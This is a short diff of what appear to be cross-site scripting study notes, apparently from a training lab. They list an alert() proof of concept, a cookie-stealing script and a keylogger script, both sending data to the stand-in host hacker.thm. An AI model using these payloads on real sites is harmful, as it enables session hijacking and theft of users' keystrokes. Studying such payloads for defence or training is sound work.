@@ -2,7 +2,7 @@
 
 POC : `<script>alert('XSS');</script>`
 
-session stealling : `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
+session stealling : `<script>fetch('https://hacker.thm/steal?cookie='+btoa(document.cookie));</script>`
 
 keyloogger : `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
 
